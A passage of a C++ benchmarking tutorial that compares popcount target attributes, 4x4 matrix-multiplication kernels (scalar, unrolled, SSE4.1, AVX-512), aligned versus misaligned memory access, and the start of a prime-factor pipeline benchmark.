        bm::DoNotOptimize(c = static_cast<std::int32_t>(static_cast<double>(++a) / static_cast<double>(++b)));
}

BENCHMARK(integral_division_with_doubles);

/**
 *  Understanding how compilation settings affect performance is crucial.
 *  The @b `-O3` optimization flag alone isn't always sufficient. Even when
 *  using compiler intrinsics like @b `__builtin_popcountll`, the actual
 *  implementation depends on the target CPU generation. If the CPU lacks
 *  a native Assembly instruction for population count, the compiler will
 *  fall back to a slower, software-emulated version.
 *
 *  To ensure optimal performance, we can use GCC attributes to specify
 *  the target CPU architecture at the function level. The only difference
 *  between the following functions is the applied target attribute,
 *  while the internal logic remains identical.
 */

#if defined(__GNUC__) && !defined(__clang__)

#if defined(__x86_64__) || defined(__i386__)
[[gnu::target("arch=core2")]]
int bits_popcount_emulated(std::uint64_t x) {
    return __builtin_popcountll(x);
}

[[gnu::target("arch=corei7")]]
int bits_popcount_native(std::uint64_t x) {
    return __builtin_popcountll(x);
}
#elif defined(__aarch64__)
[[gnu::target("arch=armv8-r")]]
int bits_popcount_emulated(std::uint64_t x) {
    return __builtin_popcountll(x);
}

[[gnu::target("arch=armv8-a")]]
int bits_popcount_native(std::uint64_t x) {
    return __builtin_popcountll(x);
}
#endif

static void bits_population_count_emulated(bm::State &state) {
    auto a = static_cast<std::uint64_t>(std::rand());
    for (auto _ : state) bm::DoNotOptimize(bits_popcount_emulated(++a));
}

BENCHMARK(bits_population_count_emulated);

static void bits_population_count_native(bm::State &state) {
    auto a = static_cast<std::uint64_t>(std::rand());
    for (auto _ : state) bm::DoNotOptimize(bits_popcount_native(++a));
}

BENCHMARK(bits_population_count_native);
#endif

/**
 *  The performance difference is substantial — a @b 3x improvement:
 *  - Core 2 variant: 2.4ns
 *  - Core i7 variant: 0.8ns
 *
 *  Fun fact: Only a few integer operations on select AMD CPUs can take as long
 *  as @b ~100 CPU cycles. This includes BMI2 bit-manipulation instructions such
 *  as @b `pdep` and @b `pext`, particularly on AMD Zen 1 and Zen 2 architectures.
 *
 *  @see BMI2 details: https://www.chessprogramming.org/BMI2
 */

#pragma endregion // Expensive Integer Operations

#pragma region Compute vs Memory Bounds with Matrix Multiplications

/**
 *  Understanding common algorithmic design patterns across various computational
 *  complexity levels is invaluable. So far, most tasks we've examined have
 *  featured linear complexity in both space and time. Broadly, the following
 *  distinctions are useful:
 *
 *  - Sublinear (e.g., @b O(logN) ): Often found in search workloads, typically IO-bound.
 *  - Linear and sub-quadratic (e.g., @b O(N) to @b O(N*logN) ): Most conventional "coding" tasks.
 *  - Low polynomial (e.g., @b O(N^1.5) to @b O(N^4) ): Common in matrix operations and graph algorithms.
 *  - High polynomial and exponential (e.g., O(N^5) and @b beyond): Rarely practical to solve.
 *
 *  Among low-polynomial tasks, matrix operations stand out as particularly important.
 *  Matrix multiplication forms the foundation of linear algebra and is critical in
 *  fields such as artificial intelligence, computer graphics, and physics simulations.
 *  Given their significance, many CPUs provide native instructions for small matrix
 *  multiplications (e.g., 4x4 or 8x8). Larger matrix multiplications are decomposed
 *  into smaller ones to take advantage of these optimizations.
 *
 *  Let's emulate such operations and explore the underlying principles.
 */

struct f32x4x4_t {
    float scalars[4][4];
};

f32x4x4_t f32x4x4_matmul_kernel(f32x4x4_t const &a, f32x4x4_t const &b) noexcept {
    f32x4x4_t c {};
    // This code gets auto-vectorized regardless of the loop order,
    // be it "ijk", "ikj", "jik", "jki", "kij", or "kji".
    // That's not necessarily the case for other matrix sizes:
    // https://lemire.me/blog/2024/06/13/rolling-your-own-fast-matrix-multiplication-loop-order-and-vectorization/
    for (std::size_t i = 0; i != 4; ++i)
        for (std::size_t j = 0; j != 4; ++j)
            for (std::size_t k = 0; k != 4; ++k) c.scalars[i][j] += a.scalars[i][k] * b.scalars[k][j];

    return c;
}

static void f32x4x4_matmul(bm::State &state) {
    f32x4x4_t a, b, c;
    std::iota(&a.scalars[0][0], &a.scalars[0][0] + 16, 16);
    std::iota(&b.scalars[0][0], &b.scalars[0][0] + 16, 0);

    for (auto _ : state) bm::DoNotOptimize(c = f32x4x4_matmul_kernel(a, b));

    std::size_t flops_per_cycle = 4 * 4 * (4 /* multiplications */ + 3 /* additions */);
    state.SetItemsProcessed(flops_per_cycle * state.iterations());
}

BENCHMARK(f32x4x4_matmul);

/**
 *  Multiplying two NxN matrices requires up to NxNxN multiplications and NxNx(N-1)
 *  additions. The asymptotic complexity is O(N^3), with the operation count scaling
 *  cubically with the matrix side. Surprisingly, the naive kernel is fully unrolled
 *  and vectorized by the compiler, achieving @b exceptional_performance:
 *  @b ~3.1ns for 112 arithmetic operations (64 multiplications + 48 additions).
 *
 *  Most of these operations are data-parallel (each cell is independent of others),
 *  enabling the CPU to execute them in parallel. Since the matrix size is small and
 *  known at compile time, the compiler optimizes via loop unrolling—a critical
 *  optimization technique every HPC developer should understand.
 *
 *  Every @b `for` loop is, in essence, a combination of a @b `goto` and an @b `if`.
 *  As we've seen in sections on recursion and branching, jumps and conditions introduce
 *  overhead. Knowing the loop bounds allows us to unroll them manually, expressing every
 *  operation explicitly.
 */

f32x4x4_t f32x4x4_matmul_unrolled_kernel(f32x4x4_t const &a_matrix, f32x4x4_t const &b_matrix) {
    f32x4x4_t c_matrix;
    float const(&a)[4][4] = a_matrix.scalars;
    float const(&b)[4][4] = b_matrix.scalars;
    float(&c)[4][4] = c_matrix.scalars;

    c[0][0] = a[0][0] * b[0][0] + a[0][1] * b[1][0] + a[0][2] * b[2][0] + a[0][3] * b[3][0];
    c[0][1] = a[0][0] * b[0][1] + a[0][1] * b[1][1] + a[0][2] * b[2][1] + a[0][3] * b[3][1];
    c[0][2] = a[0][0] * b[0][2] + a[0][1] * b[1][2] + a[0][2] * b[2][2] + a[0][3] * b[3][2];
    c[0][3] = a[0][0] * b[0][3] + a[0][1] * b[1][3] + a[0][2] * b[2][3] + a[0][3] * b[3][3];

    c[1][0] = a[1][0] * b[0][0] + a[1][1] * b[1][0] + a[1][2] * b[2][0] + a[1][3] * b[3][0];
    c[1][1] = a[1][0] * b[0][1] + a[1][1] * b[1][1] + a[1][2] * b[2][1] + a[1][3] * b[3][1];
    c[1][2] = a[1][0] * b[0][2] + a[1][1] * b[1][2] + a[1][2] * b[2][2] + a[1][3] * b[3][2];
    c[1][3] = a[1][0] * b[0][3] + a[1][1] * b[1][3] + a[1][2] * b[2][3] + a[1][3] * b[3][3];

    c[2][0] = a[2][0] * b[0][0] + a[2][1] * b[1][0] + a[2][2] * b[2][0] + a[2][3] * b[3][0];
    c[2][1] = a[2][0] * b[0][1] + a[2][1] * b[1][1] + a[2][2] * b[2][1] + a[2][3] * b[3][1];
    c[2][2] = a[2][0] * b[0][2] + a[2][1] * b[1][2] + a[2][2] * b[2][2] + a[2][3] * b[3][2];
    c[2][3] = a[2][0] * b[0][3] + a[2][1] * b[1][3] + a[2][2] * b[2][3] + a[2][3] * b[3][3];

    c[3][0] = a[3][0] * b[0][0] + a[3][1] * b[1][0] + a[3][2] * b[2][0] + a[3][3] * b[3][0];
    c[3][1] = a[3][0] * b[0][1] + a[3][1] * b[1][1] + a[3][2] * b[2][1] + a[3][3] * b[3][1];
    c[3][2] = a[3][0] * b[0][2] + a[3][1] * b[1][2] + a[3][2] * b[2][2] + a[3][3] * b[3][2];
    c[3][3] = a[3][0] * b[0][3] + a[3][1] * b[1][3] + a[3][2] * b[2][3] + a[3][3] * b[3][3];

    return c_matrix;
}

static void f32x4x4_matmul_unrolled(bm::State &state) {
    f32x4x4_t a, b, c;
    std::iota(&a.scalars[0][0], &a.scalars[0][0] + 16, 16);
    std::iota(&b.scalars[0][0], &b.scalars[0][0] + 16, 0);

    for (auto _ : state) bm::DoNotOptimize(c = f32x4x4_matmul_unrolled_kernel(a, b));

    std::size_t flops_per_cycle = 4 * 4 * (4 /* multiplications */ + 3 /* additions */);
    state.SetItemsProcessed(flops_per_cycle * state.iterations());
}

BENCHMARK(f32x4x4_matmul_unrolled);

/**
 *  The unrolled variant completes in @b 3.1ns, benefiting from auto-vectorization
 *  using SIMD. Modern CPUs leverage super-scalar execution, often called SIMD
 *  (Single Instruction, Multiple Data). These units operate on 128-, 256-, or
 *  512-bit words, containing multiple smaller components (e.g., 64-, 32-, 16-,
 *  or 8-bit integers or floats). While compilers handle auto-vectorization in
 *  many cases, they often fall short of manual optimizations. Achieving a 5x
 *  speedup is common with hand-tuned SIMD code, with some operations seeing
 *  10-100x improvements for certain data types.
 *
 *  @see "Understanding SIMD: Infinite Complexity of Trivial Problems"
 *       https://www.modular.com/blog/understanding-simd-infinite-complexity-of-trivial-problems
 *  @see "GCC Compiler vs Human - 119x Faster Assembly"
 *       https://ashvardanian.com/posts/gcc-12-vs-avx512fp16/
 *
 *  To push the limits of performance further, let's switch from scalar
 *  operations in the unrolled kernel to @b SSE4.1 SIMD instructions—among the
 *  earliest SIMD instruction sets available on most x86 CPUs—and explore how
 *  close we can get to the theoretical 100x improvement.
 */

#if defined(__SSE2__)
#include <smmintrin.h> // `_mm_dp_ps` and `_MM_TRANSPOSE4_PS`

#if defined(__GNUC__) && !defined(__clang__)
#pragma GCC push_options
#pragma GCC target("sse2", "sse3", "sse4.1")
#elif defined(__clang__)
#pragma clang attribute push(__attribute__((target("sse2,sse3,sse4.1"))), apply_to = function)
#endif

f32x4x4_t f32x4x4_matmul_sse41_kernel(f32x4x4_t const &a, f32x4x4_t const &b) noexcept {
    f32x4x4_t c;
    // Load a continuous vector of 4x floats in a single instruction., invoked
    // by the `_mm_loadu_ps` intrinsic.
    __m128 a_row_0 = _mm_loadu_ps(&a.scalars[0][0]);
    __m128 a_row_1 = _mm_loadu_ps(&a.scalars[1][0]);
    __m128 a_row_2 = _mm_loadu_ps(&a.scalars[2][0]);
    __m128 a_row_3 = _mm_loadu_ps(&a.scalars[3][0]);

    // Load the columns of the matrix B, by loading the 4 rows and then
    // transposing with an SSE macro:
    // https://randombit.net/bitbashing/posts/integer_matrix_transpose_in_sse2.html
    __m128 b_col_0 = _mm_loadu_ps(&b.scalars[0][0]);
    __m128 b_col_1 = _mm_loadu_ps(&b.scalars[1][0]);
    __m128 b_col_2 = _mm_loadu_ps(&b.scalars[2][0]);
    __m128 b_col_3 = _mm_loadu_ps(&b.scalars[3][0]);
    _MM_TRANSPOSE4_PS(b_col_0, b_col_1, b_col_2, b_col_3);

    // Multiply A rows by B columns and store the result in C.
    // Use bitwise "OR" to aggregate dot products and store results.
    //
    // The individual dot products are calculated with the `_mm_dp_ps`
    // intrinsic, which is a dot product of two vectors, with the result stored
    // in a single float. The last argument is a mask, which specifies which
    // components of the vectors should be multiplied and added.
    __m128 c_row_0 = _mm_or_ps( //
        _mm_or_ps(_mm_dp_ps(a_row_0, b_col_0, 0xF1), _mm_dp_ps(a_row_0, b_col_1, 0xF2)),
        _mm_or_ps(_mm_dp_ps(a_row_0, b_col_2, 0xF4), _mm_dp_ps(a_row_0, b_col_3, 0xF8)));
    _mm_storeu_ps(&c.scalars[0][0], c_row_0);

    __m128 c_row_1 = _mm_or_ps( //
        _mm_or_ps(_mm_dp_ps(a_row_1, b_col_0, 0xF1), _mm_dp_ps(a_row_1, b_col_1, 0xF2)),
        _mm_or_ps(_mm_dp_ps(a_row_1, b_col_2, 0xF4), _mm_dp_ps(a_row_1, b_col_3, 0xF8)));
    _mm_storeu_ps(&c.scalars[1][0], c_row_1);

    __m128 c_row_2 = _mm_or_ps( //
        _mm_or_ps(_mm_dp_ps(a_row_2, b_col_0, 0xF1), _mm_dp_ps(a_row_2, b_col_1, 0xF2)),
        _mm_or_ps(_mm_dp_ps(a_row_2, b_col_2, 0xF4), _mm_dp_ps(a_row_2, b_col_3, 0xF8)));
    _mm_storeu_ps(&c.scalars[2][0], c_row_2);

    __m128 c_row_3 = _mm_or_ps( //
        _mm_or_ps(_mm_dp_ps(a_row_3, b_col_0, 0xF1), _mm_dp_ps(a_row_3, b_col_1, 0xF2)),
        _mm_or_ps(_mm_dp_ps(a_row_3, b_col_2, 0xF4), _mm_dp_ps(a_row_3, b_col_3, 0xF8)));
    _mm_storeu_ps(&c.scalars[3][0], c_row_3);

    return c;
}

#if defined(__GNUC__) && !defined(__clang__)
#pragma GCC pop_options
#elif defined(__clang__)
#pragma clang attribute pop
#endif

static void f32x4x4_matmul_sse41(bm::State &state) {
    f32x4x4_t a, b, c;
    std::iota(&a.scalars[0][0], &a.scalars[0][0] + 16, 16);
    std::iota(&b.scalars[0][0], &b.scalars[0][0] + 16, 0);

    for (auto _ : state) bm::DoNotOptimize(c = f32x4x4_matmul_sse41_kernel(a, b));

    std::size_t flops_per_cycle = 4 * 4 * (4 /* multiplications */ + 3 /* additions */);
    state.SetItemsProcessed(flops_per_cycle * state.iterations());
}

BENCHMARK(f32x4x4_matmul_sse41);
#endif // defined(__SSE2__)

/**
 *  The result is @b 19.6ns compared to the @b 3.1ns from the unrolled kernel.
 *  It turns out we were not as clever as we thought. Disassembling the unrolled
 *  kernel reveals that the compiler was already optimizing it better than we did.
 *  Each line compiles into a series of efficient instructions like:
 *
 *      vmovss  xmm0, dword ptr [rdi]
 *      vmovss  xmm1, dword ptr [rdi + 4]
 *      vmulss  xmm1, xmm1, dword ptr [rsi + 16]
 *      vfmadd231ss     xmm1, xmm0, dword ptr [rsi]
 *      vmovss  xmm0, dword ptr [rdi + 8]
 *      vfmadd132ss     xmm0, xmm1, dword ptr [rsi + 32]
 *      vmovss  xmm1, dword ptr [rdi + 12]
 *      vfmadd132ss     xmm1, xmm0, dword ptr [rsi + 48]
 *      vmovss  dword ptr [rdx], xmm1
 *
 *  Instructions like `vfmadd132ss` and `vfmadd231ss` operating on @b `xmm`
 *  registers show how smart the compiler was at exploiting SIMD capabilities.
 *  But the game isn't over—there's still room to optimize for larger instruction
 *  sets.
 *
 *  @see Explore the unrolled kernel assembly on GodBolt:
 *       https://godbolt.org/z/bW5nnTKs1
 *  @see Explore instruction latencies on @b uops.info:
 *       https://uops.info/table.html
 *
 *  With AVX-512 on modern CPUs, we can fit an entire matrix into a single
 *  @b `zmm` register (512 bits wide). This Instruction Set Extension is available
 *  on Intel Skylake-X, Ice Lake, and AMD Zen4 CPUs, offering powerful functionality.
 *  However, on Zen4, AVX-512 is emulated as two 256-bit operations, so the performance
 *  isn't as strong as on Intel CPUs. Native support comes with Zen5.
 */
#if defined(__AVX512F__)
#include <immintrin.h> // `_mm512_loadu_ps`
#if defined(__GNUC__) && !defined(__clang__)
#pragma GCC push_options
#pragma GCC target("avx2", "avx512f", "avx512bw", "avx512vl", "bmi2")
#elif defined(__clang__)
#pragma clang attribute push(__attribute__((target("avx2,avx512f,avx512bw,avx512vl,bmi2"))), apply_to = function)
#endif

f32x4x4_t f32x4x4_matmul_avx512_kernel(f32x4x4_t const &a, f32x4x4_t const &b) noexcept {
    __m512 a_mat = _mm512_loadu_ps(&a.scalars[0][0]);
    __m512 b_mat = _mm512_loadu_ps(&b.scalars[0][0]);

    __m512 a_vec_1 = _mm512_permute_ps(a_mat, 0x0);
    __m512 b_vec_1 = _mm512_broadcast_f32x4(_mm512_castps512_ps128(b_mat));
    __m512 c_vec = _mm512_mul_ps(a_vec_1, b_vec_1);

    __m512 a_vec_2 = _mm512_permute_ps(a_mat, 0x55);
    b_mat = _mm512_castsi512_ps(_mm512_alignr_epi64(_mm512_castps_si512(b_mat), _mm512_castps_si512(b_mat), 0x2));
    __m512 b_vec_2 = _mm512_broadcast_f32x4(_mm512_castps512_ps128(b_mat));
    c_vec = _mm512_fmadd_ps(a_vec_2, b_vec_2, c_vec);

    __m512 a_vec_3 = _mm512_permute_ps(a_mat, 0xAA);
    b_mat = _mm512_castsi512_ps(_mm512_alignr_epi64(_mm512_castps_si512(b_mat), _mm512_castps_si512(b_mat), 0x2));
    __m512 b_vec_3 = _mm512_broadcast_f32x4(_mm512_castps512_ps128(b_mat));
    c_vec = _mm512_fmadd_ps(a_vec_3, b_vec_3, c_vec);

    __m512 a_vec_4 = _mm512_permute_ps(a_mat, 0xFF);
    b_mat = _mm512_castsi512_ps(_mm512_alignr_epi64(_mm512_castps_si512(b_mat), _mm512_castps_si512(b_mat), 0x2));
    __m512 b_vec_4 = _mm512_broadcast_f32x4(_mm512_castps512_ps128(b_mat));
    c_vec = _mm512_fmadd_ps(a_vec_4, b_vec_4, c_vec);

    f32x4x4_t c;
    _mm512_storeu_ps(&c.scalars[0][0], c_vec);
    return c;
}

#if defined(__GNUC__) && !defined(__clang__)
#pragma GCC pop_options
#elif defined(__clang__)
#pragma clang attribute pop
#endif

static void f32x4x4_matmul_avx512(bm::State &state) {
    f32x4x4_t a, b, c;
    std::iota(&a.scalars[0][0], &a.scalars[0][0] + 16, 16);
    std::iota(&b.scalars[0][0], &b.scalars[0][0] + 16, 0);

    for (auto _ : state) bm::DoNotOptimize(c = f32x4x4_matmul_avx512_kernel(a, b));

    std::size_t flops_per_cycle = 4 * 4 * (4 /* multiplications */ + 3 /* additions */);
    state.SetItemsProcessed(flops_per_cycle * state.iterations());
}
BENCHMARK(f32x4x4_matmul_avx512);

#endif // defined(__AVX512F__)

/**
 *  The result is @b 2.8ns on Sapphire Rapids—a modest 10% improvement. To
 *  fully leverage AVX-512, we need larger matrices where horizontal reductions
 *  don't dominate latency. For small sizes like 4x4, the wide ZMM registers
 *  aren't fully utilized.
 *
 *  As an exercise, try implementing matrix multiplication for 3x3 matrices.
 *  Despite requiring fewer operations (27 multiplications and 18 additions
 *  compared to 64 multiplications and 48 additions for 4x4), the compiler
 *  may peak at @b 5.3ns — whopping @b 71% slower for a @b 60% smaller task!
 *
 *  AVX-512 includes advanced instructions like `_mm512_mask_compressstoreu_ps`
 *  and `_mm512_maskz_expandloadu_ps`, which could be used with a mask like
 *  @b 0b0000'0111'0111'0111 to handle 3x3 matrices. However, their high latency
 *  means the performance will still degrade—@b around 5ns in practice.
 *
 *  Benchmark everything! Don't assume less work translates to faster execution.
 */

#pragma endregion // Compute vs Memory Bounds with Matrix Multiplications

#pragma region Alignment of Memory Accesses

/**
 *  When designing high-performance kernels, memory alignment is crucial.
 *  Misaligned memory accesses split data across cache lines, causing extra
 *  loads and reducing efficiency. While split loads are unavoidable for large
 *  data structures, smaller kernels can benefit significantly from careful
 *  memory management.
 *
 *  Modern CPUs typically have 64-byte cache lines, though Apple's M-series
 *  uses 128 bytes. This means assuming @b `alignas(64)` won't ensure compatibility.
 *  Instead, cache properties must be inferred at runtime for optimal performance.
 *
 *  In this benchmark, we demonstrate how `std::sort` behaves when processing
 *  cache-line-sized objects that are either correctly aligned or intentionally
 *  misaligned. This covers:
 *
 *  - Using a custom strided iterator (`strided_ptr`) to simulate offset memory access.
 *  - Generating semi-random integers using Knuth's multiplicative hash.
 *  - Reading cache properties with platform-specific APIs.
 *  - Flushing the CPU cache between runs to ensure consistent results.
 */

#include <cassert>  // `assert`
#include <fstream>  // `std::ifstream`
#include <iterator> // `std::random_access_iterator_tag`
#include <memory>   // `std::assume_aligned`
#include <string>   // `std::string`, `std::stoull`

/**
 *  @brief  Reads the contents of a file from the specified path into a string.
 */
std::string read_file_contents(std::string const &path) {
    std::ifstream file(path);
    std::string content;
    if (!file.is_open()) return 0;
    std::getline(file, content);
    file.close();
    return content;
}

/**
 *  @brief  Fetches the cache line size using OS-specific APIs.
 *          Supports Linux, macOS, and Windows.
 *
 *  It's easier to use the @b `std::hardware_destructive_interference_size`
 *  in C++ 17 and newer, if the `__cpp_lib_hardware_interference_size` feature
 *  macro is defined. But this will be incorrect, if the compilation platform
 *  is different from the runtime platform.
 *
 *  A more advanced approach would be to use hardware-specific instructions,
 *  like the @b `cpuid` on x86, and infer the cache line size from the returned
 *  bitmasks. That's however, not only different on Arm, but also differs
 *  between Intel and AMD!
 */
std::size_t fetch_cache_line_width() {

#if defined(__linux__)
    // On Linux, we can read the cache line size and the L2 cache size from the
    // "sysfs" virtual filesystem. It can provide the properties of each individual
    // CPU core.
    std::string file_contents = read_file_contents("/sys/devices/system/cpu/cpu0/cache/index0/coherency_line_size");
    std::size_t cache_line_size = std::stoull(file_contents);
    return cache_line_size;

#elif defined(__APPLE__)
    // On macOS, we can use the `sysctlbyname` function to read the
    // `hw.cachelinesize` and `hw.l2cachesize` values into unsigned integers.
    // You can achieve the same by using the `sysctl -a` command-line utility.
    size_t size;
    size_t len = sizeof(size);
    if (sysctlbyname("hw.cachelinesize", &size, &len, nullptr, 0) == 0) return size;

#elif defined(_WIN32)
    SYSTEM_LOGICAL_PROCESSOR_INFORMATION buffer[256];
    DWORD len = sizeof(buffer);
    if (GetLogicalProcessorInformation(buffer, &len))
        for (size_t i = 0; i < len / sizeof(SYSTEM_LOGICAL_PROCESSOR_INFORMATION); ++i)
            if (buffer[i].Relationship == RelationCache && buffer[i].Cache.Level == 1) return buffer[i].Cache.LineSize;
#endif

    return 0;
}

/**
 *  @brief  A minimalistic pointer with non-unit stride/step.
 */
template <typename value_type_>
class strided_ptr {
    std::byte *data_;
    std::size_t stride_;

  public:
    using value_type = value_type_;
    using pointer = value_type_ *;
    using reference = value_type_ &;
    using difference_type = std::ptrdiff_t;
    using iterator_category = std::random_access_iterator_tag;

    strided_ptr(std::byte *data, std::size_t stride_bytes) : data_(data), stride_(stride_bytes) {
        assert(data_ && "Pointer must not be null, as NULL arithmetic is undefined");
    }
#if defined(__cpp_lib_assume_aligned) // Not available in Apple Clang
    reference operator*() const noexcept {
        return *std::launder(std::assume_aligned<1>(reinterpret_cast<pointer>(data_)));
    }
    reference operator[](difference_type i) const noexcept {
        return *std::launder(std::assume_aligned<1>(reinterpret_cast<pointer>(data_ + i * stride_)));
    }
#else
    reference operator*() const noexcept { return *reinterpret_cast<pointer>(data_); }
    reference operator[](difference_type i) const noexcept { return *reinterpret_cast<pointer>(data_ + i * stride_); }
#endif // defined(__cpp_lib_assume_aligned)

    // clang-format off
    pointer operator->() const noexcept { return &operator*(); }
    strided_ptr &operator++() noexcept { data_ += stride_; return *this; }
    strided_ptr operator++(int) noexcept { strided_ptr temp = *this; ++(*this); return temp; }
    strided_ptr &operator--() noexcept { data_ -= stride_; return *this; }
    strided_ptr operator--(int) noexcept { strided_ptr temp = *this; --(*this); return temp; }
    strided_ptr &operator+=(difference_type offset) noexcept { data_ += offset * stride_; return *this; }
    strided_ptr &operator-=(difference_type offset) noexcept { data_ -= offset * stride_; return *this; }
    strided_ptr operator+(difference_type offset) noexcept { strided_ptr temp = *this; return temp += offset; }
    strided_ptr operator-(difference_type offset) noexcept { strided_ptr temp = *this; return temp -= offset; }
    friend difference_type operator-(strided_ptr const &a, strided_ptr const &b) noexcept { assert(a.stride_ == b.stride_); return (a.data_ - b.data_) / static_cast<difference_type>(a.stride_); }
    friend bool operator==(strided_ptr const &a, strided_ptr const &b) noexcept { return a.data_ == b.data_; }
    friend bool operator<(strided_ptr const &a, strided_ptr const &b) noexcept { return a.data_ < b.data_; }
    friend bool operator!=(strided_ptr const &a, strided_ptr const &b) noexcept { return !(a == b); }
    friend bool operator>(strided_ptr const &a, strided_ptr const &b) noexcept { return b < a; }
    friend bool operator<=(strided_ptr const &a, strided_ptr const &b) noexcept { return !(b < a); }
    friend bool operator>=(strided_ptr const &a, strided_ptr const &b) noexcept { return !(a < b); }
    // clang-format on
};

#if defined(__aarch64__)
/**
 *  @brief  Helper derived from `__aarch64_sync_cache_range` in `libgcc`, used to
 *          @b flush the cache on Arm64, where the x86 `_mm_clflush` intrinsic is not available.
 *  @param  address The address to flush from the cache, must be aligned to the cache line size.
 */
void _mm_clflush(void const *address) { asm volatile("dc\tcvau, %0" : : "r"(address) : "memory"); }
#endif

template <bool aligned_>
static void memory_access(bm::State &state) {
    constexpr std::size_t typical_l2_size = 1024u * 1024u;
    std::size_t const cache_line_width = fetch_cache_line_width();
    assert( //
        cache_line_width > 0 && __builtin_popcountll(cache_line_width) == 1 &&
        "The cache line width must be a power of two greater than 0");

    // We are using a fairly small L2-cache-sized buffer to show, that this is
    // not just about Big Data. Anything beyond a few megabytes with irregular
    // memory accesses may suffer from the same issues. For split-loads, pad our
    // buffer with an extra `cache_line_width` bytes of space.
    std::size_t const buffer_size = typical_l2_size + cache_line_width;
    std::unique_ptr<std::byte, decltype(&std::free)> const buffer(                        //
        reinterpret_cast<std::byte *>(std::aligned_alloc(cache_line_width, buffer_size)), //
        &std::free);
    std::byte *const buffer_ptr = buffer.get();

    // Let's initialize a strided range using out `strided_ptr` template, but
    // for `aligned_ == false` make sure that the scalar-of-interest in each
    // stride is located exactly at the boundary between two cache lines.
    std::size_t const offset_within_page = !aligned_ ? (cache_line_width - sizeof(std::uint32_t) / 2) : 0;
    strided_ptr<std::uint32_t> integers(buffer_ptr + offset_within_page, cache_line_width);

    // We will start with a random seed position and walk through the buffer.
    std::uint32_t semi_random_state = 0xFFFFFFFFu;
    std::size_t const count_pages = typical_l2_size / cache_line_width;
    for (auto _ : state) {
        // Generate some semi-random data, using Knuth's multiplicative hash
        // number derived from the golden ratio.
        std::generate_n(integers, count_pages, [&semi_random_state] { return semi_random_state *= 2654435761u; });

        // Flush all of the pages out of the cache.
        // The `__builtin___clear_cache(buffer_ptr, buffer_ptr + buffer.size())`
        // compiler intrinsic can't be used for the data cache, only the
        // instructions cache. For Arm, GCC provides a `__aarch64_sync_cache_range`
        // intrinsic, but it's not available in Clang.
        for (std::size_t i = 0; i != count_pages; ++i) _mm_clflush(&integers[i]);
        bm::ClobberMemory();

        std::sort(integers, integers + count_pages);
    }
}

static void memory_access_unaligned(bm::State &state) { memory_access<false>(state); }
static void memory_access_aligned(bm::State &state) { memory_access<true>(state); }

BENCHMARK(memory_access_unaligned)->MinTime(10);
BENCHMARK(memory_access_aligned)->MinTime(10);

/**
 *  One variant executes in 5.8 miliseconds, and the other in 5.2 miliseconds,
 *  consistently resulting a @b 10% performance difference.
 */

#pragma endregion // Alignment of Memory Accesses

#pragma region Non Uniform Memory Access

/**
 *  Takes a string like "64K" and "128M" and returns the corresponding size in
 *  bytes, expanding the multiple prefixes to the actual size, like "65536" and
 *  "134217728", respectively.
 */
std::size_t parse_size_string(std::string const &str) {
    std::size_t value = std::stoull(str);
    if (str.find("K") != std::string::npos || str.find("k") != std::string::npos) { value *= 1024; }
    else if (str.find("M") != std::string::npos || str.find("m") != std::string::npos) { value *= 1024 * 1024; }
    else if (str.find("G") != std::string::npos || str.find("g") != std::string::npos) { value *= 1024 * 1024 * 1024; }
    return value;
}

#pragma endregion // Non Uniform Memory Access

#pragma endregion // - Numerics

#pragma region - Pipelines and Abstractions

/**
 *  Designing efficient kernels is only the first step; composing them
 *  into full programs without losing performance is the real challenge.
 *
 *  Consider a hypothetical numeric processing pipeline:
 *
 *    1. Generate all integers in a given range (e.g., [1, 49]).
 *    2. Filter out integers that are perfect squares.
 *    3. Expand each remaining number into its prime factors.
 *    4. Sum all prime factors from the filtered numbers.
 *
 *  We'll explore four implementations of this pipeline:
 *
 *    - C++11 using `template`-based @b lambda functions.
 *    - C++11 using @b `std::function` for dynamic callbacks.
 *    - C++20 @b coroutines using a lightweight generator.
 *    - C++20 @b ranges with a lazily evaluated factorization.
 */
constexpr std::uint64_t pipe_start = 3;
constexpr std::uint64_t pipe_end = 49;

/**
 *  @brief  Checks if a number is a power of two.
 */
[[gnu::always_inline]]
inline bool is_power_of_two(std::uint64_t x) noexcept {
    return __builtin_popcountll(x) == 1;
}

/**
 *  @brief  Checks if a number is a power of three using modulo division.
 *          The largest power of three fitting in a 64-bit integer is 3^40.
 */
[[gnu::always_inline]]
inline bool is_power_of_three(std::uint64_t x) noexcept {
    constexpr std::uint64_t max_power_of_three = 12157665459056928801ull;
    return x > 0 && max_power_of_three % x == 0;
}

#pragma region Coroutines and Asynchronous Programming

/**
 *  @brief  Supplies the prime factors to a template-based callback.
 */
template <typename callback_type_>
[[gnu::always_inline]] inline void prime_factors_lambdas( //
    std::uint64_t input, callback_type_ &&callback) noexcept {
    // Handle factor 2 separately
    while ((input & 1) == 0) {
        callback(2);
        input >>= 1; // equivalent to `input /= 2`
    }

    // Now factor is always odd, start from 3 and go up by 2
    for (std::uint64_t factor = 3; factor * factor <= input; factor += 2) {
        while (input % factor == 0) {
            callback(factor);
            input /= factor;
        }
    }

    // If input is still greater than 1, then it's a prime factor
    if (input > 1) callback(input);
}

static void pipeline_cpp11_lambdas(bm::State &state) {
    std::uint64_t sum = 0, count = 0;
    for (auto _ : state) {
        sum = 0, count = 0;
        for (std::uint64_t value = pipe_start; value <= pipe_end; ++value) {
            if (!is_power_of_two(value) && !is_power_of_three(value))
                prime_factors_lambdas(value, [&](std::uint64_t factor) { sum += factor, count++; });
        }
        if (count != 84 || sum != 645) state.SkipWithError("Incorrect result");
    }
}

BENCHMARK(pipeline_cpp11_lambdas);

/**
 *  A more conventional approach using @b `std::function` callbacks.
 *  While this simplifies the interface, it introduces heap allocations,
 *  and brings a lot of noisy source code into your translation unit:
 *  up to @b 27'400 lines of code, being one of the largest standard
 *  headers according to Philip Trettner's "C++ Compile Health Watchdog".
 *
 *  @see Headers length: https://artificial-mind.net/projects/compile-health/
 */
#include <functional> // `std::function`

static void for_range_stl(std::uint64_t start, std::uint64_t end, std::function<void(std::uint64_t)> const &callback) {
    for (std::uint64_t i = start; i <= end; ++i) callback(i);
}

static void filter_stl( //
    std::uint64_t value, std::function<bool(std::uint64_t)> const &predicate,
    std::function<void(std::uint64_t)> const &callback) {
    if (!predicate(value)) callback(value);
}

static void prime_factors_stl(std::uint64_t input, std::function<void(std::uint64_t)> const &callback) {
    prime_factors_lambdas(input, callback);
}

static void pipeline_cpp11_stl(bm::State &state) {
    std::uint64_t sum = 0, count = 0;
    for (auto _ : state) {
        sum = 0, count = 0;
        for_range_stl(pipe_start, pipe_end, [&](std::uint64_t value) {
